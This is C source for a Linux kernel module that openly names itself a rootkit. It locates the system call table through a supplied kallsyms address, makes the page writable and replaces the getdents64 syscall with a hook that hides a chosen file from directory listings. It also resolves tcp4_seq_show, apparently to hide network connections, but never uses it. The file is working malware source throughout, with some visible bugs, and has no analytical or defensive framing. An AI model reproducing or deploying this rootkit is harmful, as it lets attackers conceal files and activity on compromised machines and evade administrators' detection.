#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <asm/unistd.h>
#include <linux/dirent.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ROYCO");
MODULE_DESCRIPTION("a kernel module rootkit");
MODULE_VERSION("1");


unsigned long (*kallsyms_lookup_name_)(const char *name);

unsigned long kallsyms_lookup_addr;
unsigned long *sys_call_table;

asmlinkage int (*old_getdents64)(const struct pt_regs *regs);
asmlinkage int new_getdents64(const struct pt_regs *regs);

static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
static int new_tcp4_seq_show(struct seq_file *seq, void *v);

char* file_to_hide; 

// parameters from command line
module_param(kallsyms_lookup_addr, ulong, S_IRUGO);
MODULE_PARM_DESC(kallsyms_lookup_addr, "kallsyms_lookup_name(char *path) function address");
module_param(file_to_hide, charp, 0000);
MODULE_PARM_DESC(file_to_hide, "file to hide from getdents64 syscall");



int set_addr_rw(unsigned long _addr) {

        unsigned int level;
        pte_t *pte;

        pte = lookup_address(_addr, &level);

        if (pte->pte &~ _PAGE_RW) {
                pte->pte |= _PAGE_RW;
        }

        return 0;
}

// function to change addr page to ro.
int set_addr_ro(unsigned long _addr) {

        unsigned int level;
        pte_t *pte;

        pte = lookup_address(_addr, &level);
        pte->pte = pte->pte &~_PAGE_RW;

        return 0;
}

static int __init rootkit_enter(void) {

 printk(KERN_INFO "rootkit is operating\n");

 kallsyms_lookup_name_ = (void*)kallsyms_lookup_addr;
 sys_call_table= (unsigned long*)kallsyms_lookup_name_("sys_call_table");

 tcp4_seq_show = (void*)kallsyms_lookup_name_("tcp4_seq_show");
 printk(KERN_INFO "found tcp4 function: %lx\n", tcp4_seq_show);
 printk(KERN_INFO "found sys_call_table address: %lx\n",sys_call_table);

 // save old getdents64 function
 old_getdents64 = sys_call_table[__NR_getdents64];

 //replace it with our custom getdents64
 set_addr_rw((unsigned long)sys_call_table);
 sys_call_table[__NR_getdents64] = new_getdents64;
 set_addr_ro((unsigned long)sys_call_table);

 printk(KERN_INFO "switched getdents64 syscall to malicious one");

 return 0;
}

static void __exit rootkit_exit(void) {

 //restore old getdents64 syscall
 set_addr_rw((unsigned long)sys_call_table);
 sys_call_table[__NR_getdents64] = old_getdents64;
 set_addr_ro((unsigned long)sys_call_table);

 printk(KERN_INFO "rootkit stopped\n");
}





/*
dirent struct for reference:
// struct linux_dirent64 {
//     u64         d_ino;
//     s64         d_off;
//     unsigned short      d_reclen;
//     unsigned char       d_type;
//     char        d_name[];
// };

iterates over the structs returned by the original getdents64.
If it finds a file name file_to_hide (provided by commandline upon insertion),
it hides it by adding the length of the struct to the length of the previous struct.
when a userspace program iterates over the results of getdents64,
it will do so by adding the d_reclen to the index every iteration.
this will make it miss the hidden file, jumping over it.
*/
asmlinkage int new_getdents64(const struct pt_regs *regs)
{
	struct linux_dirent64 *dirent_kern, *dirent, *curr_ent, *prev_ent = NULL; 
	unsigned int len;

	unsigned long index = 0;

	unsigned short reclen;
	long error;

	dirent = (struct linux_dirent64*)(regs->si);

	len = old_getdents64(regs);
	dirent_kern = kzalloc(len, GFP_KERNEL);
	if(dirent_kern <=0 || (dirent_kern == NULL))
		return len;

	error = copy_from_user(dirent_kern, dirent, len);
	if (error)
		goto done;
	
	printk(KERN_INFO "%s\n",dirent_kern->d_name);

	curr_ent = (void*)dirent_kern + index;
	prev_ent = curr_ent;

	while (index < len)
	{
		prev_ent = curr_ent;
		curr_ent = (void*)dirent_kern + index;

		//printk(KERN_INFO "what's this : %s\n",curr_ent->d_name);
		if (strcmp(file_to_hide, curr_ent->d_name) == 0){
			printk(KERN_INFO "found secret file: %s",file_to_hide);
			if (index == 0 )// special case
			{
				len -= curr_ent->d_reclen;
				memmove(curr_ent, curr_ent+curr_ent->d_reclen, len);
			}
			else
			{
				prev_ent->d_reclen += curr_ent->d_reclen;
			}
		}
		//if (strcmp(dirent_kern))
		index += curr_ent->d_reclen;
	}

	error = copy_to_user(dirent, dirent_kern, len);
	if (error)
		goto done;	

	done:
		kfree(dirent_kern);
		return len;
	
	
}


module_init(rootkit_enter);
module_exit(rootkit_exit);

